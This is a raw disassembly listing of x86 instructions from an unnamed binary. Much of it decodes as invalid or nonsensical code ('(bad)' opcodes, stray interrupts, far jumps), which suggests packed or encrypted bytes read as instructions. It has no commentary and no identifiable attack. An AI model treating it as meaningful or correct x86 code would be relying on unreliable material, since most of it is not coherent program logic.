  423ad3:	jno    0x423aa2
  423ad5:	lea    esi,[ebp+0x3bb596cd]
  423adb:	or     al,0x3b
  423add:	cdq    
  423ade:	shr    ebx,cl
  423ae0:	xchg   edx,eax
  423ae1:	shr    edx,cl
  423ae3:	sub    BYTE PTR [ebx+0x13],dl
  423ae6:	jno    0x423ae8
  423ae8:	(bad)  
  423ae9:	add    BYTE PTR gs:[eax+0x1c],dh
  423aed:	int    0x76
  423aef:	rcl    bl,1
  423af1:	ins    DWORD PTR es:[edi],dx
  423af2:	xchg   edx,eax
  423af3:	cmp    ecx,ecx
  423af5:	inc    ebx
  423af6:	leave  
  423af7:	int    0x76
  423af9:	mov    ch,cl
  423afb:	lea    ebp,ds:0x811101cd
  423b01:	add    BYTE PTR [eax-0x29d26933],0x54
  423b08:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423b0b:	cdq    
  423b0c:	shr    ebx,cl
  423b0e:	xchg   edx,eax
  423b0f:	shr    edx,cl
  423b11:	sub    BYTE PTR [ebx+0x13],dl
  423b14:	jno    0x423ae3
  423b16:	lea    esi,[ebp+0x3bb596cd]
  423b1c:	or     al,0x3b
  423b1e:	cdq    
  423b1f:	shr    ebx,cl
  423b21:	xchg   edx,eax
  423b22:	shr    edx,cl
  423b24:	sub    BYTE PTR [ebx+0x13],dl
  423b27:	jno    0x423b29
  423b29:	(bad)  
  423b2a:	jne    0x423b2c
  423b2c:	jo     0x423b4a
  423b2e:	int    0x76
  423b30:	lods   eax,DWORD PTR ds:[esi]
  423b31:	or     dh,BYTE PTR [esi+0x75]
  423b34:	int    0x76
  423b36:	cmp    eax,0xecfd760a
  423b3b:	cmp    BYTE PTR [ebx],bh
  423b3d:	or     al,0x3b
  423b3f:	cdq    
  423b40:	shr    ebx,cl
  423b42:	xchg   edx,eax
  423b43:	shr    edx,cl
  423b45:	sub    BYTE PTR [ebx+0x13],dl
  423b48:	jno    0x423b17
  423b4a:	lea    esi,[ebp+0x3bb596cd]
  423b50:	or     al,0x3b
  423b52:	cdq    
  423b53:	shr    ebx,cl
  423b55:	xchg   edx,eax
  423b56:	shr    edx,cl
  423b58:	sub    BYTE PTR [ebx+0x13],dl
  423b5b:	jno    0x423b5d
  423b5d:	(bad)  
  423b5e:	lods   eax,DWORD PTR ds:[esi]
  423b5f:	add    BYTE PTR [eax+0x1c],dh
  423b62:	int    0x76
  423b64:	std    
  423b65:	or     dh,BYTE PTR [esi+0x1d]
  423b68:	int    0x76
  423b6a:	jne    0x423b76
  423b6c:	out    0x55,al
  423b6e:	or     dh,BYTE PTR [esi-0x30]
  423b71:	leave  
  423b72:	jbe    0x423b11
  423b74:	inc    ecx
  423b75:	and    DWORD PTR [esi+0x5576cd35],eax
  423b7b:	int    0x8d
  423b7d:	push   ebp
  423b7e:	cmp    edi,DWORD PTR [ecx+0x3b]
  423b81:	or     al,0xd3
  423b83:	lods   eax,DWORD PTR ds:[esi]
  423b84:	sub    bl,dl
  423b86:	jmp    0x423b1a
  423b88:	push   ebx
  423b89:	ror    DWORD PTR [edx],cl
  423b8b:	jbe    0x423bd2
  423b8d:	int    0x76
  423b8f:	push   ebp
  423b90:	int    0x8d
  423b92:	push   ebp
  423b93:	cmp    edi,DWORD PTR [ecx+0x3b]
  423b96:	or     al,0xd3
  423b98:	lods   eax,DWORD PTR ds:[esi]
  423b99:	sub    bl,dl
  423b9b:	jmp    0x423b2f
  423b9d:	push   ebx
  423b9e:	ror    DWORD PTR [edx],cl
  423ba0:	jbe    0x423baf
  423ba2:	leave  
  423ba3:	jbe    0x423b3a
  423ba5:	dec    eax
  423ba6:	and    DWORD PTR [esi-0x528936cb],eax
  423bac:	ret    0x8621
  423baf:	xor    eax,0xcd5576cd
  423bb4:	lea    edx,[ebp+0x3b]
  423bb7:	jns    0x423bf4
  423bb9:	or     al,0xd3
  423bbb:	jmp    0x423b4f
  423bbd:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423bc3:	lea    ebx,ds:0x52f7d43
  423bc9:	push   ss
  423bca:	xchg   DWORD PTR [eax-0x6d241480],eax
  423bd0:	add    BYTE PTR [eax-0x326a7233],0x76
  423bd7:	xchg   ebp,eax
  423bd8:	int    0x96
  423bda:	inc    ebp
  423bdb:	cmp    eax,ebp
  423bdd:	cmp    ecx,DWORD PTR [edi]
  423bdf:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423be5:	push   ebx
  423be6:	jge    0x423bb5
  423be8:	jbe    0x423c07
  423bea:	xor    edx,edx
  423bec:	cmp    ebx,edx
  423bee:	clc    
  423bef:	add    cl,BYTE PTR [edx]
  423bf1:	jbe    0x423c00
  423bf3:	int    0x76
  423bf5:	lods   eax,DWORD PTR ds:[esi]
  423bf6:	int    0x8d
  423bf8:	lods   eax,DWORD PTR ds:[esi]
  423bf9:	cmp    edi,DWORD PTR [ecx+0x3b]
  423bfc:	or     al,0xd3
  423bfe:	jmp    0x423b92
  423c00:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423c06:	lea    ecx,ds:0x16d87d43
  423c0c:	int    0x76
  423c0e:	lods   eax,DWORD PTR ds:[esi]
  423c0f:	int    0x8d
  423c11:	lods   eax,DWORD PTR ds:[esi]
  423c12:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c15:	or     al,0xd3
  423c17:	lods   eax,DWORD PTR ds:[esi]
  423c18:	sub    bl,dl
  423c1a:	jmp    0x423bae
  423c1c:	push   ebx
  423c1d:	ror    DWORD PTR [edx],cl
  423c1f:	jbe    0x423c2e
  423c21:	int    0x76
  423c23:	xchg   ebp,eax
  423c24:	int    0x8d
  423c26:	xchg   ebp,eax
  423c27:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c2a:	or     al,0xd3
  423c2c:	lods   eax,DWORD PTR ds:[esi]
  423c2d:	sub    bl,dl
  423c2f:	jmp    0x423bc3
  423c31:	push   ebx
  423c32:	ror    ebp,cl
  423c34:	lea    ecx,ds:0xad3d12f
  423c3a:	jbe    0x423c49
  423c3c:	int    0x76
  423c3e:	push   ebp
  423c3f:	int    0x8d
  423c41:	push   ebp
  423c42:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c45:	or     al,0xd3
  423c47:	jmp    0x423bdb
  423c49:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423c4f:	lea    ecx,ds:0x52f7d43
  423c55:	pusha  
  423c56:	xchg   edx,eax
  423c57:	add    BYTE PTR [eax+0xa0d76cd],0x76
  423c5e:	or     eax,0x874576cd
  423c63:	jbe    0x423c35
  423c65:	or     ah,dh
  423c67:	cmp    eax,0x5d5d760a
  423c6c:	inc    ecx
  423c6d:	and    DWORD PTR [esi+0x6d760a35],eax
  423c73:	leave  
  423c74:	jbe    0x423cdb
  423c76:	cmp    DWORD PTR [ecx],esp
  423c78:	xchg   BYTE PTR ds:0xb22576c9,dh
  423c7e:	and    DWORD PTR [esi-0xe89f5cb],eax
  423c84:	int    0x76
  423c86:	cmp    eax,0x3b3d8dcd
  423c8b:	jns    0x423cc8
  423c8d:	or     al,0xd3
  423c8f:	lods   eax,DWORD PTR ds:[esi]
  423c90:	sub    bl,dl
  423c92:	jmp    0x423c26
  423c94:	push   ebx
  423c95:	ror    DWORD PTR [edx],cl
  423c97:	jbe    0x423d16
  423c99:	int    0x6d
  423c9b:	jmp    0x423ca3
  423c9d:	add    DWORD PTR [eax-0x36923280],0x8c06
  423ca7:	add    BYTE PTR [ebx],cl
  423ca9:	and    DWORD PTR [esi-0x369232cb],eax
  423caf:	push   es
  423cb0:	jl     0x423cb2
  423cb2:	add    BYTE PTR [eax],al
  423cb4:	mul    DWORD PTR [ecx]
  423cb6:	xchg   BYTE PTR ds:0x6dcd6dcd,dh
  423cbc:	int    0x76
  423cbe:	icebp  
  423cbf:	int    0x8d
  423cc1:	icebp  
  423cc2:	cmp    edi,DWORD PTR [ecx+0x3b]
  423cc5:	or     al,0xd3
  423cc7:	lods   eax,DWORD PTR ds:[esi]
  423cc8:	sub    bl,dl
  423cca:	jmp    0x423c5e
  423ccc:	push   ebx
  423ccd:	ror    ebp,cl
  423ccf:	lea    edi,[ebp+0x2f]
  423cd2:	rcl    ebx,1
  423cd4:	int    0x8d
  423cd6:	pop    ebp
  423cd7:	retf   0x8884
  423cda:	or     DWORD PTR [esi-0x1f],esi
  423cdd:	int    0x6d
  423cdf:	int    0x76
  423ce1:	icebp  
  423ce2:	int    0x8d
  423ce4:	icebp  
  423ce5:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423ce8:	jns    0x423cbd
  423cea:	jmp    0x423c7e
  423cec:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423cf2:	lea    edi,[ebp+0x2f]
  423cf5:	rcl    ebx,1
  423cf7:	int    0x8d
  423cf9:	gs int 0x96
  423cfc:	cmp    ecx,DWORD PTR gs:[edi]
  423cff:	cmp    edx,ebp
  423d01:	shl    edx,cl
  423d03:	sub    bl,dl
  423d05:	repz xchg edx,eax
  423d07:	push   ebx
  423d08:	adc    eax,DWORD PTR [edi+0x5d8dcdd3]
  423d0e:	das    
  423d0f:	pop    ecx
  423d10:	dec    esp
  423d11:	mov    ch,cl
  423d13:	push   es
  423d14:	mov    WORD PTR [eax],es
  423d16:	add    BYTE PTR [eax],al
  423d18:	int    0x17
  423d1a:	mov    WORD PTR [eax],es
  423d1c:	add    BYTE PTR [eax],al
  423d1e:	cmp    edi,DWORD PTR [ecx+0x3b]
  423d21:	aad    0xd3
  423d23:	lods   eax,DWORD PTR ds:[esi]
  423d24:	sub    bl,dl
  423d26:	repz xchg edx,eax
  423d28:	push   ebx
  423d29:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423d2f:	loope  0x423d6c
  423d31:	jge    0x423d3c
  423d33:	(bad)  
  423d34:	loope  0x423d03
  423d36:	ins    DWORD PTR es:[edi],dx
  423d37:	retf   0xe176
  423d3a:	int    0x8d
  423d3c:	icebp  
  423d3d:	int    0x96
  423d3f:	icebp  
  423d40:	cmp    ecx,DWORD PTR [edi]
  423d42:	cmp    edx,ebp
  423d44:	shl    ebx,cl
  423d46:	xchg   edx,eax
  423d47:	shl    edx,cl
  423d49:	sub    BYTE PTR [ebx+0x13],dl
  423d4c:	int    0x96
  423d4e:	jge    0x423d7f
  423d50:	rcl    DWORD PTR [ebx],1
  423d52:	int    0x96
  423d54:	pop    ebp
  423d55:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  423d5c:	icebp  
  423d5d:	int    0x8d
  423d5f:	icebp  
  423d60:	cmp    edi,DWORD PTR [ecx+0x3b]
  423d63:	or     al,0xd3
  423d65:	lods   eax,DWORD PTR ds:[esi]
  423d66:	sub    bl,dl
  423d68:	jmp    0x423cfc
  423d6a:	push   ebx
  423d6b:	ror    ebp,cl
  423d6d:	lea    edi,[ebp+0x2f]
  423d70:	rcl    ebx,1
  423d72:	int    0x8d
  423d74:	pop    ebp
  423d75:	retf   0x8884
  423d78:	or     DWORD PTR [esi-0x1f],esi
  423d7b:	int    0x6d
  423d7d:	int    0x76
  423d7f:	icebp  
  423d80:	int    0x8d
  423d82:	icebp  
  423d83:	cmp    edi,DWORD PTR [ecx-0x2d]
  423d86:	lods   eax,DWORD PTR ds:[esi]
  423d87:	sub    BYTE PTR [ebx],bh
  423d89:	or     al,0xd3
  423d8b:	jmp    0x423d1f
  423d8d:	push   ebx
  423d8e:	ror    ebp,cl
  423d90:	lea    edi,[ebp+0x2f]
  423d93:	rcl    ebx,1
  423d95:	int    0x8d
  423d97:	ins    DWORD PTR es:[edi],dx
  423d98:	int    0x96
  423d9a:	ins    DWORD PTR es:[edi],dx
  423d9b:	cmp    ecx,DWORD PTR [edi]
  423d9d:	cmp    edx,ebp
  423d9f:	shl    edx,cl
  423da1:	sub    bl,dl
  423da3:	repz xchg edx,eax
  423da5:	push   ebx
  423da6:	adc    eax,DWORD PTR [edi+0x5d8dcdd3]
  423dac:	das    
  423dad:	pop    ecx
  423dae:	dec    esp
  423daf:	mov    ch,cl
  423db1:	push   es
  423db2:	jl     0x423db4
  423db4:	add    BYTE PTR [eax],al
  423db6:	int    0x17
  423db8:	jl     0x423dba
  423dba:	add    BYTE PTR [eax],al
  423dbc:	cmp    edi,DWORD PTR [ecx+0x3b]
  423dbf:	aad    0xd3
  423dc1:	lods   eax,DWORD PTR ds:[esi]
  423dc2:	sub    bl,dl
  423dc4:	repz xchg edx,eax
  423dc6:	push   ebx
  423dc7:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423dcd:	loope  0x423e0a
  423dcf:	jge    0x423dda
  423dd1:	(bad)  
  423dd2:	loope  0x423da1
  423dd4:	ins    DWORD PTR es:[edi],dx
  423dd5:	retf   0xe176
  423dd8:	int    0x8d
  423dda:	icebp  
  423ddb:	int    0x96
  423ddd:	icebp  
  423dde:	cmp    ecx,DWORD PTR [edi]
  423de0:	cmp    edx,ebp
  423de2:	shl    ebx,cl
  423de4:	xchg   edx,eax
  423de5:	shl    edx,cl
  423de7:	sub    BYTE PTR [ebx+0x13],dl
  423dea:	int    0x96
  423dec:	jge    0x423e1d
  423dee:	rcl    DWORD PTR [ebx],1
  423df0:	int    0x96
  423df2:	pop    ebp
  423df3:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  423dfa:	and    eax,0x3b258dcd
  423dff:	or     al,0x3b
  423e01:	jns    0x423dd6
  423e03:	jmp    0x423d97
  423e05:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423e0b:	lea    ebp,[ebp-0x33]
  423e0e:	xchg   esi,eax
  423e0f:	ins    DWORD PTR es:[edi],dx
  423e10:	cmp    ecx,DWORD PTR [edi]
  423e12:	cmp    edx,ebp
  423e14:	shl    edx,cl
  423e16:	sub    bl,dl
  423e18:	repz xchg edx,eax
  423e1a:	push   ebx
  423e1b:	adc    ebp,DWORD PTR [edi]
  423e1d:	rcl    ebx,1
  423e1f:	xchg   DWORD PTR [esi+0x7d],esi
  423e22:	or     dh,BYTE PTR [esi+0x7d]
  423e25:	int    0x76
  423e27:	jge    0x423df6
  423e29:	lea    ecx,ds:0xb2f7d43
  423e2f:	(bad)  
  423e30:	inc    DWORD PTR [eax]
  423e32:	add    ch,cl
  423e34:	jbe    0x423ea3
  423e36:	int    0x8d
  423e38:	ins    DWORD PTR es:[edi],dx
  423e39:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423e3c:	jmp    0x423dd0
  423e3e:	cmp    edi,DWORD PTR [ecx-0x2d]
  423e41:	lods   eax,DWORD PTR ds:[esi]
  423e42:	sub    BYTE PTR [ebx-0x2d],dl
  423e45:	int    0x8d
  423e47:	or     eax,0xcdd3d12f
  423e4c:	lea    edi,ds:0xf2d30f3b
  423e52:	sub    BYTE PTR [ebx-0x2d],dl
  423e55:	int    0x8d
  423e57:	cmp    eax,0xebd30c3b
  423e5c:	xchg   edx,eax
  423e5d:	push   ebx
  423e5e:	ror    DWORD PTR [edx],cl
  423e60:	jbe    0x423ec7
  423e62:	int    0x76
  423e64:	popf   
  423e65:	int    0x8d
  423e67:	popf   
  423e68:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423e6b:	jmp    0x423dff
  423e6d:	cmp    edi,DWORD PTR [ecx-0x2d]
  423e70:	lods   eax,DWORD PTR ds:[esi]
  423e71:	sub    BYTE PTR [ebx-0x2d],dl
  423e74:	int    0x8d
  423e76:	popf   
  423e77:	int    0x96
  423e79:	popf   
  423e7a:	cmp    ecx,DWORD PTR [edi]
  423e7c:	shl    edx,cl
  423e7e:	sub    BYTE PTR [ebx],bh
  423e80:	aad    0xd3
  423e82:	repz xchg edx,eax
  423e84:	push   ebx
  423e85:	adc    eax,DWORD PTR [edi+0x7d87658d]
  423e8b:	xchg   DWORD PTR [ebp+0x458d0a45],ecx
  423e91:	in     al,dx
  423e92:	sbb    al,0xcd
  423e94:	jbe    0x423e33
  423e96:	int    0x8d
  423e98:	popf   
  423e99:	cmp    edi,DWORD PTR [ecx+0x3b]
  423e9c:	or     al,0xd3
  423e9e:	lods   eax,DWORD PTR ds:[esi]
  423e9f:	sub    bl,dl
  423ea1:	jmp    0x423e35
  423ea3:	push   ebx
  423ea4:	rol    DWORD PTR [edi+0x760a4576],cl
  423eaa:	inc    ebp
  423eab:	int    0x76
  423ead:	popf   
  423eae:	int    0x8d
  423eb0:	popf   
  423eb1:	cmp    edi,DWORD PTR [ecx-0x2d]
  423eb4:	lods   eax,DWORD PTR ds:[esi]
  423eb5:	sub    BYTE PTR [ebx],bh
  423eb7:	or     al,0xd3
  423eb9:	jmp    0x423e4d
  423ebb:	push   ebx
  423ebc:	ror    ebp,cl
  423ebe:	lea    ebx,ds:0x76cd7d33
  423ec4:	popf   
  423ec5:	int    0x96
  423ec7:	popf   
  423ec8:	cmp    edi,DWORD PTR [ecx+0x3b]
  423ecb:	aad    0xd3
  423ecd:	repz xchg edx,eax
  423ecf:	shr    DWORD PTR [ebp-0x322dacd8],cl
  423ed5:	xchg   esi,eax
  423ed6:	inc    ebp
  423ed7:	das    
  423ed8:	rcl    edx,1
  423eda:	inc    ebx
  423edb:	shr    DWORD PTR [edi],cl
  423edd:	pop    es
  423ede:	adc    ebp,edi
  423ee0:	add    BYTE PTR [eax],al
  423ee2:	int    0x76
  423ee4:	mov    BYTE PTR [eax],al
  423ee6:	(bad)  
  423ee7:	dec    esp
  423ee8:	iret   
  423ee9:	jbe    0x423ea8
  423eeb:	add    dh,dl
  423eed:	mov    BYTE PTR [eax-0x33],dh
  423ef0:	jbe    0x423e7a
  423ef2:	int    0x1
  423ef4:	xchg   ebp,eax
  423ef5:	add    DWORD PTR [eax-0x32afff80],0x1cd8876
  423eff:	icebp  
  423f00:	add    DWORD PTR [eax+0x500080],0xd600fdd6
  423f0a:	jne    0x423ec9
  423f0c:	test   al,0x88
  423f0e:	add    BYTE PTR [eax-0x322f89f6],0x76
  423f15:	stc    
  423f16:	int    0x8d
  423f18:	stc    
  423f19:	cmp    eax,ebp
  423f1b:	cmp    ecx,DWORD PTR [edi]
  423f1d:	shl    edx,cl
  423f1f:	sub    bl,dl
  423f21:	mov    ebp,0xcdd35392
  423f26:	lea    esi,[ebp+0x43]
  423f29:	rcl    esp,cl
  423f2b:	push   esi
  423f2c:	int    0x76
  423f2e:	mov    ch,cl
  423f30:	lea    ebp,ds:0xcd2d96cd
  423f36:	add    DWORD PTR [ecx],edx
  423f38:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423f42:	shr    edx,cl
  423f44:	sub    BYTE PTR [ebx+0x13],dl
  423f47:	jno    0x423f16
  423f49:	(bad)  
  423f4a:	stc    
  423f4b:	int    0x96
  423f4d:	stc    
  423f4e:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423f51:	cdq    
  423f52:	shr    ebx,cl
  423f54:	xchg   edx,eax
  423f55:	shr    edx,cl
  423f57:	sub    BYTE PTR [ebx+0x13],dl
  423f5a:	jno    0x423f5c
  423f5c:	(bad)  
  423f5d:	jne    0x423f5f
  423f5f:	jo     0x423f7d
  423f61:	stos   BYTE PTR es:[edi],al
  423f62:	test   al,0x63
  423f64:	retf   
  423f65:	ror    BYTE PTR [eax-0x12326980],cl
  423f6b:	add    al,0xed
  423f6d:	and    al,0x98
  423f6f:	int    0x11
  423f71:	int    0x12
  423f73:	sub    eax,0x4808081
  423f78:	pop    esp
  423f79:	sub    BYTE PTR [edi],0x5
  423f7c:	dec    edx
  423f7d:	add    DWORD PTR [eax+0x2fda0680],0x80819205
  423f87:	add    BYTE PTR [esi],0xf7
  423f8a:	das    
  423f8b:	add    eax,0x80808003
  423f90:	int    0x7
  423f92:	or     DWORD PTR [eax+0x6d068080],eax
  423f98:	das    
  423f99:	add    eax,0x808080e9
  423f9e:	add    al,0x69
  423fa0:	int3   
  423fa1:	add    BYTE PTR [eax+0x52f3080],0xe2
  423fa8:	add    BYTE PTR [eax+0x54985e80],0x2f
  423faf:	add    eax,0x808080e3
  423fb4:	int    0xc1
  423fb6:	and    eax,0x4808081
  423fbb:	mov    dh,0x11
  423fbd:	or     ch,0x13
  423fc0:	xor    ecx,DWORD PTR [esi-0x79]
  423fc3:	shr    BYTE PTR [edi],cl
  423fc5:	mov    ebx,0x8d0a4c70
  423fca:	mov    ch,0x2f
  423fcc:	mov    ebx,0x13874e7c
  423fd1:	das    
  423fd2:	add    eax,0x80808049
  423fd7:	iret   
  423fd8:	jl     0x423fee
  423fda:	pop    ebx
  423fdb:	or     cl,BYTE PTR [ebp+0x69bd]
  423fe1:	add    BYTE PTR [ebx-0x2baef966],al
  423fe7:	or     ebp,0x31
  423fea:	add    al,0xb6
  423fec:	cmc    
  423fed:	sub    BYTE PTR [ebx],0x99
  423ff0:	xchg   ecx,esi
  423ff2:	das    
  423ff3:	mov    ebx,0xbb2f4ee0
  423ff8:	mov    al,ds:0xd4fc874c
  423ffd:	mov    esi,0xa148acf
  424002:	(bad)  
  424003:	in     eax,dx
  424004:	push   es
  424005:	push   ecx
  424006:	aam    0x6e
  424008:	int    0x89
  42400a:	add    al,0xb6
  42400c:	stc    
  42400d:	sub    BYTE PTR [ebx],0xf
  424010:	xchg   DWORD PTR [ebp+0x2f],edi
  424013:	mov    ebx,0xbb2f4ede
  424018:	sahf   
  424019:	dec    esp
  42401a:	xchg   esp,edi
  42401c:	aam    0x33
  42401e:	iret   
  42401f:	ficom  WORD PTR [edx+ecx*1]
  424022:	out    0xfd,al
  424024:	int    0xe6
  424026:	std    
  424027:	int    0x6a
  424029:	push   es
  42402a:	add    ah,dl
  42402c:	xchg   ch,cl
  42402e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42402f:	mov    ch,0x81
  424031:	and    al,0x8b
  424033:	das    
  424034:	mov    ebx,0xbb2f4ede
  424039:	sahf   
  42403a:	dec    esp
  42403b:	add    BYTE PTR [esi-0x7],dh
  42403e:	add    al,0x76
  424040:	std    
  424041:	mov    BYTE PTR [edi-0x619a104],al
  424047:	sbb    ch,0x2f
  42404a:	mov    ebx,0xbb2f4ee0
  42404f:	mov    al,ds:0xed8dcd4c
  424054:	add    BYTE PTR [esi-0xb],dh
  424057:	add    al,0xd3
  424059:	mov    BYTE PTR [edi-0x1272f504],al
  42405f:	pop    esi
  424060:	out    0xf5,al
  424062:	sub    BYTE PTR ds:0x2fbd8dcd,0xbb
  424069:	jo     0x4240b9
  42406b:	das    
  42406c:	mov    ebx,0x76004cdc
  424071:	adc    DWORD PTR [ebx+edx*8],eax
  424074:	mov    BYTE PTR [edi-0x4272f527],al
  42407a:	pop    esi
  42407b:	xchg   esi,eax
  42407c:	adc    DWORD PTR [edi],ebp
  42407e:	or     ebp,DWORD PTR [esi-0x56000000]
  424084:	arpl   WORD PTR [ebx],di
  424086:	ins    DWORD PTR es:[edi],dx
  424087:	ins    BYTE PTR es:[edi],dx
  424088:	in     al,dx
  424089:	xchg   edx,eax
  42408a:	cmp    ebp,DWORD PTR [ebp-0x58]
  42408d:	retf   
  42408e:	lds    edx,FWORD PTR [esi+0xacdedcd]
  424094:	sub    eax,0xcd808081
  424099:	jbe    0x4240e7
  42409b:	add    al,0xed
  42409d:	xor    BYTE PTR [ebx+0x3b],bl
  4240a0:	fstp   QWORD PTR [eax+0x2f1e5e9a]
  4240a6:	add    eax,0x8080800b
  4240ab:	inc    ebx
  4240ac:	(bad)
  4240af:	pop    esi
  4240b0:	pushf  
  4240b1:	(bad)  
  4240b3:	test   DWORD PTR [ebx],edi
  4240b5:	ins    DWORD PTR es:[edi],dx
  4240b6:	ins    BYTE PTR es:[edi],dx
  4240b7:	in     al,dx
  4240b8:	fmul   st,st(5)
  4240ba:	ins    BYTE PTR es:[edi],dx
  4240bb:	fadd   QWORD PTR [edi+0x7ccd8876]
  4240c1:	and    al,0xcd
  4240c3:	jo     0x4240f9
  4240c5:	int    0x90
  4240c7:	adc    al,0xcd
  4240c9:	fcomp  QWORD PTR [edi+eax*4]
  4240cc:	lea    ecx,[eax+0xa889687]
  4240d2:	(bad)  
  4240d3:	std    
  4240d4:	inc    ebx
  4240d5:	clc    
  4240d6:	jnp    0x42405f
  4240d8:	or     ah,dh
  4240da:	std    
  4240db:	or     ah,BYTE PTR [esi-0x259a107]
  4240e1:	fsub   st,st(3)
  4240e3:	inc    ebx
  4240e4:	pushf  
  4240e5:	adc    al,0x77
  4240e7:	xchg   BYTE PTR [edi],ch
  4240e9:	mov    ebx,0x92eca054
  4240ee:	int    0xf4
  4240f0:	iret   
  4240f1:	push   esp
  4240f2:	ror    ebp,0x68
  4240f5:	push   es
  4240f6:	add    ah,dl
  4240f8:	ds xchg esi,esp
  4240fb:	mov    BYTE PTR [edx],cl
  4240fd:	out    0x11,al
  4240ff:	inc    ebx
  424100:	stc    
  424101:	fdiv   DWORD PTR [eax]
  424103:	int    0xa6
  424105:	dec    esp
  424106:	int    0x63
  424108:	in     al,0x87
  42410a:	popf   
  42410b:	inc    ebx
  42410c:	cld    
  42410d:	ja     0x424093
  42410f:	int    0x58
  424111:	in     al,dx
  424112:	mov    BYTE PTR [ebx],dh
  424114:	out    0x88,al
  424116:	or     ch,BYTE PTR [eax-0x33]
  424119:	(bad)  
  42411a:	adc    DWORD PTR [esi],eax
  42411c:	not    esp
  42411e:	dec    esi
  42411f:	int    0xa6
  424121:	stc    
  424122:	dec    ebx
  424123:	or     ah,BYTE PTR [esi-0x259bc07]
  424129:	sbb    BYTE PTR [ebp-0x14],0x8
  42412d:	cmp    ebp,DWORD PTR [ebp-0x56]
  424130:	test   al,0x63
  424132:	retf   
  424133:	ror    BYTE PTR [eax-0x12326980],cl
  424139:	add    al,0xed
  42413b:	push   eax
  42413c:	pop    ebx
  42413d:	cwde   
  42413e:	pop    ebp
  42413f:	dec    ecx
  424140:	and    DWORD PTR [esi-0x289f5cb],eax
  424146:	leave  
  424147:	jbe    0x424142
  424149:	inc    ecx
  42414a:	and    DWORD PTR [esi-0x27232cb],eax
  424150:	int    0xa6
  424152:	std    
  424153:	call   0x3b81:0x90cfffc0
  42415a:	psrlq  mm5,mm3
  42415d:	xchg   edx,eax
  42415e:	stos   BYTE PTR es:[edi],al
  42415f:	cmp    esp,ecx
  424161:	shl    ebp,cl
  424163:	sub    BYTE PTR [ebx+0xc],dl
  424166:	or     cl,BYTE PTR [ebp-0x2723243]
  42416c:	int    0x8d
  42416e:	std    
  42416f:	int    0x8d
  424171:	std    
  424172:	int    0x8d
  424174:	std    
  424175:	int    0x8d
  424177:	std    
  424178:	int    0x8d
  42417a:	std    
  42417b:	int    0x8d
  42417d:	std    
  42417e:	int    0x8d
  424180:	std    
  424181:	int    0x8d
  424183:	std    
  424184:	int    0x8d
  424186:	std    
  424187:	leave  
  424188:	jbe    0x42419b
  42418a:	fadd   st,st(5)
  42418c:	loope  0x4241e3
  42418e:	int    0x8d
  424190:	std    
  424191:	int    0xa6
  424193:	std    
  424194:	cmp    esp,ecx
  424196:	cmp    ecx,DWORD PTR [edi]
  424198:	shl    ebp,cl
  42419a:	sub    bl,dl
  42419c:	jmp    0x424130
  42419e:	push   ebx
  42419f:	or     al,0xcd
  4241a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4241a2:	dec    esp
  4241a3:	int    0x9f
  4241a5:	sub    eax,0x43808081
  4241aa:	push   ebx
  4241ab:	das    
  4241ac:	add    eax,0x80808717
  4241b1:	int    0x8d
  4241b3:	std    
  4241b4:	int    0xa6
  4241b6:	std    
  4241b7:	cmp    ecx,DWORD PTR [edi]
  4241b9:	cmp    esp,ecx
  4241bb:	shr    ebx,cl
  4241bd:	xchg   edx,eax
  4241be:	shl    ebp,cl
  4241c0:	sub    BYTE PTR [ebx+0xc],dl
  4241c3:	inc    ebx
  4241c4:	adc    ebp,DWORD PTR [edi]
  4241c6:	add    eax,0x8080877f
  4241cb:	int    0xca
  4241cd:	add    DWORD PTR [eax-0x69327f80],eax
  4241d3:	std    
  4241d4:	int    0xa6
  4241d6:	std    
  4241d7:	cmp    ebx,DWORD PTR [ecx-0xc2c1ec5]
  4241dd:	xchg   edx,eax
  4241de:	shl    ebp,cl
  4241e0:	sub    BYTE PTR [ebx-0x2b],dl
  4241e3:	inc    ebx
  4241e4:	adc    ebp,DWORD PTR [edi]
  4241e6:	add    eax,0x8080875b
  4241eb:	xchg   DWORD PTR [ebp-0xe72f578],ecx
  4241f1:	int    0xf1
  4241f3:	cmp    ebx,DWORD PTR [ecx-0x1ec46233]
  4241f9:	shl    ebx,cl
  4241fb:	xchg   edx,eax
  4241fc:	shl    ebp,cl
  4241fe:	sub    BYTE PTR [ebx-0x2b],dl
  424201:	or     dl,BYTE PTR [esi+0x1196cd11]
  424207:	inc    ebx
  424208:	icebp  
  424209:	aam    0x26
  42420b:	int    0x76
  42420d:	std    
  42420e:	int    0x96
  424210:	std    
  424211:	cmp    ebx,ecx
  424213:	cmp    edi,DWORD PTR [ecx-0x2d]
  424216:	jmp    0xd253:0x92bdd328
  42421d:	int    0x96
  42421f:	adc    DWORD PTR [ebx-0x26],esi
  424222:	adc    al,0x5e
  424224:	test   BYTE PTR [edx-0x2a],cl
  424227:	xor    cl,ch
  424229:	jbe    0x424228
  42422b:	int    0x96
  42422d:	std    
  42422e:	cmp    ebx,ecx
  424230:	cmp    edi,DWORD PTR [ecx-0x2d]
  424233:	jmp    0xd253:0x92bdd328
  42423a:	int    0x96
  42423c:	adc    DWORD PTR [ebx-0x26],esi
  42423f:	adc    al,0x5e
  424241:	je     0x42428d
  424243:	xor    BYTE PTR [edi],ch
  424245:	add    eax,0x808092df
  42424a:	int    0x76
  42424c:	std    
  42424d:	int    0x76
  42424f:	std    
  424250:	int    0xa6
  424252:	std    
  424253:	int    0x76
  424255:	std    
  424256:	cmp    ecx,ecx
